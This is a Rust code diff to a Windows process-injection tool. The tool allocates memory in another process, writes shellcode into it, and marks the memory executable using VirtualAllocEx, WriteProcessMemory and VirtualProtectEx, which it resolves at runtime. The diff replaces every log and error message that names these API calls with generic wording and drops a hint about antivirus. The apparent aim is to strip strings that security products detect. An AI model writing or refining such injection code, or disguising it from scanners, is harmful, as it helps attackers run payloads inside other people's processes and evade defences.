@@ -16,7 +16,7 @@ const PROCESS_VM_OPERATION: u32 = 0x0008;
 
 #[cfg(windows)]
 pub fn free_remote(process: *mut std::ffi::c_void, base: *mut std::ffi::c_void, log: &LogSink) {
-    log.detail("[cleanup] VirtualFreeEx — MEM_RELEASE");
+    log.detail("[cleanup] Free remote memory");
     unsafe {
         let _ = crate::resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE);
     }
@@ -30,7 +30,7 @@ pub fn cleanup(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
     ));
     let process = unsafe { crate::resolve::OpenProcess(PROCESS_VM_OPERATION, 0, pid) };
     if process.is_null() {
-        log.error("OpenProcess failed".to_string());
+        log.error("process open failed".to_string());
         return;
     }
     let base = remote_base as *mut std::ffi::c_void;
@@ -39,7 +39,7 @@ pub fn cleanup(pid: u32, remote_base: u64, size: usize, log: &LogSink) {
     if result != 0 {
         log.step("[CLEANUP] Remote memory freed successfully.");
     } else {
-        log.error("[CLEANUP] VirtualFreeEx failed".to_string());
+        log.error("[CLEANUP] remote memory free failed".to_string());
     }
 }
 
@@ -52,10 +52,7 @@ pub fn write_remote_payload(
 ) -> Result<*mut std::ffi::c_void, String> {
     let size = shellcode.len();
 
-    log.step(format!(
-        "[2/{}] VirtualAllocEx — MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE",
-        total_steps
-    ));
+    log.step(format!("[2/{}] Allocate remote memory", total_steps));
     let base = unsafe {
         crate::resolve::VirtualAllocEx(
             process,
@@ -67,7 +64,7 @@ pub fn write_remote_payload(
     };
     if base.is_null() {
         return Err(
-            "VirtualAllocEx returned NULL — allocation failed (check AV/privileges)".to_string(),
+            "remote allocation failed (check privileges)".to_string(),
         );
     }
     log.info(format!(
@@ -75,10 +72,7 @@ pub fn write_remote_payload(
         base, size
     ));
 
-    log.step(format!(
-        "[3/{}] WriteProcessMemory — {} bytes",
-        total_steps, size
-    ));
+    log.step(format!("[3/{}] Write {} bytes", total_steps, size));
     let mut written: usize = 0;
     let ok = unsafe {
         crate::resolve::WriteProcessMemory(
@@ -91,14 +85,11 @@ pub fn write_remote_payload(
     };
     if ok == 0 {
         free_remote(process, base, log);
-        return Err("WriteProcessMemory failed".to_string());
+        return Err("remote write failed".to_string());
     }
     log.info(format!("      wrote {} bytes", written));
 
-    log.step(format!(
-        "[4/{}] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ",
-        total_steps
-    ));
+    log.step(format!("[4/{}] Set memory protection", total_steps));
     let mut old_protect: u32 = 0;
     let ok = unsafe {
         crate::resolve::VirtualProtectEx(
@@ -111,7 +102,7 @@ pub fn write_remote_payload(
     };
     if ok == 0 {
         free_remote(process, base, log);
-        return Err("VirtualProtectEx failed".to_string());
+        return Err("memory protection change failed".to_string());
     }
     log.info(format!(
         "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
